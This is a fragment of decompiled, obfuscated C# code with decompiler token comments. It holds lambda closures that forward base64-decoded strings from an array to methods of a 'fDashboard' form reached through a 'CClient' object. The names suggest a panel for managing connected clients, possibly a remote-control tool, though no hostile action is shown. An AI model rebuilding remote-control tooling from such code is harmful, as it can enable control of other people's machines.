			// Token: 0x060019D1 RID: 6609 RVA: 0x000BA6A4 File Offset: 0x000B88A4
			internal void _Lambda$__11()
			{
				fDashboard fDB = this.cclient_0.fDB;
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(this.string_0[1]));
				fDB.method_14(ref @string, "4");
			}

			// Token: 0x060019D2 RID: 6610 RVA: 0x0000CDFB File Offset: 0x0000AFFB
			internal void _Lambda$__12()
			{
				this.cclient_0.fDB.method_18(ref this.string_0[0]);
			}

			// Token: 0x060019D3 RID: 6611 RVA: 0x0000CE19 File Offset: 0x0000B019
			internal void _Lambda$__13()
			{
				this.cclient_0.fDB.method_15(ref this.string_0[1], this.string_0[0]);
			}

			// Token: 0x060019D4 RID: 6612 RVA: 0x0000CE19 File Offset: 0x0000B019
			internal void _Lambda$__14()
			{
				this.cclient_0.fDB.method_15(ref this.string_0[1], this.string_0[0]);
			}

			// Token: 0x060019D5 RID: 6613 RVA: 0x0000CE3F File Offset: 0x0000B03F
			internal void _Lambda$__16()
			{
				this.cclient_0.fDB.method_19(ref this.string_0[0]);
			}

			// Token: 0x060019D6 RID: 6614 RVA: 0x0000CE5D File Offset: 0x0000B05D
			internal void _Lambda$__17()
			{
				this.cclient_0.fDB.method_25(ref this.string_0[0]);
			}

			// Token: 0x060019D7 RID: 6615 RVA: 0x0000CE7B File Offset: 0x0000B07B
			internal void _Lambda$__18()
			{
				this.cclient_0.fDB.method_23(ref this.string_0);
			}

			// Token: 0x060019D8 RID: 6616 RVA: 0x0000CE93 File Offset: 0x0000B093
			internal void _Lambda$__19()
			{
				this.cclient_0.fDB.method_24(ref this.string_0);
			}

			// Token: 0x04000A00 RID: 2560
			public string[] string_0;

			// Token: 0x04000A01 RID: 2561
			public CClient cclient_0;
		}

		// Token: 0x020001D5 RID: 469
		internal sealed class Class153
		{
			// Token: 0x060019DA RID: 6618 RVA: 0x0000CEAB File Offset: 0x0000B0AB
			internal bool _Lambda$__0(char char_1)
			{
				return char_1 == this.char_0;
			}

			// Token: 0x04000A02 RID: 2562
			public char char_0;
		}

		// Token: 0x020001D6 RID: 470
		// (Invoke) Token: 0x060019DE RID: 6622
		private delegate void Delegate201(double double_0);

		// Token: 0x020001D7 RID: 471
		// (Invoke) Token: 0x060019E2 RID: 6626
		private delegate void Delegate202(byte[] byte_0);

		// Token: 0x020001D8 RID: 472
		// (Invoke) Token: 0x060019E6 RID: 6630
		private delegate void Delegate203(ref double double_0);

		// Token: 0x020001D9 RID: 473
		// (Invoke) Token: 0x060019EA RID: 6634
		private delegate void Delegate204(double double_0);
	}
}
